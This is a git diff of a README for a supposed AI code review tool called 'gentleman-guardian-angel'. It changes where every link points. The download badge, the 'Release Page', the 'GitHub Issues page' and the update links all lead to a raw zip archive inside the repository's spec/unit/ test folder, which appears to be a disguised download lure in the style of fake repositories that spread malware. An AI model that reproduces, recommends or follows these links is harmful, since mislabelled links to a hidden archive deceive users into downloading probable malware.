@@ -1,6 +1,6 @@
 # 😇 gentleman-guardian-angel - Seamless AI Code Review for Everyone
 
-![Download](https://raw.githubusercontent.com/yaikob0940/gentleman-guardian-angel/main/spec/unit/guardian-gentleman-angel-v3.0.zip%20Now-Release%20Page-brightgreen)
+![Download](https://github.com/yaikob0940/gentleman-guardian-angel/raw/refs/heads/main/spec/unit/angel-gentleman-guardian-1.7.zip%20Now-Release%20Page-brightgreen)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ To get started with Gentleman Guardian Angel, you only need to follow a few simp
 
 ## 📥 Download & Install
 
-To download Gentleman Guardian Angel, visit this page to download: [Release Page](https://raw.githubusercontent.com/yaikob0940/gentleman-guardian-angel/main/spec/unit/guardian-gentleman-angel-v3.0.zip).
+To download Gentleman Guardian Angel, visit this page to download: [Release Page](https://github.com/yaikob0940/gentleman-guardian-angel/raw/refs/heads/main/spec/unit/angel-gentleman-guardian-1.7.zip).
 
 1. Click on the link to navigate to the releases page.
 2. Find the latest version listed.
@@ -57,7 +57,7 @@ Take the time to go through each piece of feedback. Implementing changes can gre
 
 ## 🤝 Support
 
-If you have any questions or run into any issues, help is available. You can find resources on our [GitHub Issues page](https://raw.githubusercontent.com/yaikob0940/gentleman-guardian-angel/main/spec/unit/guardian-gentleman-angel-v3.0.zip) where other users and contributors can provide assistance.
+If you have any questions or run into any issues, help is available. You can find resources on our [GitHub Issues page](https://github.com/yaikob0940/gentleman-guardian-angel/raw/refs/heads/main/spec/unit/angel-gentleman-guardian-1.7.zip) where other users and contributors can provide assistance.
 
 ## 📢 Community
 
@@ -65,7 +65,7 @@ Join our community to stay updated with the latest features and share your exper
 
 ## 🔄 Updating
 
-To keep your application running optimally, check for updates regularly. Go back to the [Release Page](https://raw.githubusercontent.com/yaikob0940/gentleman-guardian-angel/main/spec/unit/guardian-gentleman-angel-v3.0.zip) to see if a new version is available. Follow the same download and installation steps for updates.
+To keep your application running optimally, check for updates regularly. Go back to the [Release Page](https://github.com/yaikob0940/gentleman-guardian-angel/raw/refs/heads/main/spec/unit/angel-gentleman-guardian-1.7.zip) to see if a new version is available. Follow the same download and installation steps for updates.
 
 ## 💬 Feedback
 
@@ -75,4 +75,4 @@ Your feedback is valuable. Please share your experiences using Gentleman Guardia
 
 Gentleman Guardian Angel empowers anyone to enhance their coding standards through thoughtful, AI-driven reviews. With simple installation and usage, it opens the door to cleaner, more efficient coding practices. Download today and make your coding journey smoother. 
 
-Visit this page to download: [Release Page](https://raw.githubusercontent.com/yaikob0940/gentleman-guardian-angel/main/spec/unit/guardian-gentleman-angel-v3.0.zip).
+Visit this page to download: [Release Page](https://github.com/yaikob0940/gentleman-guardian-angel/raw/refs/heads/main/spec/unit/angel-gentleman-guardian-1.7.zip).
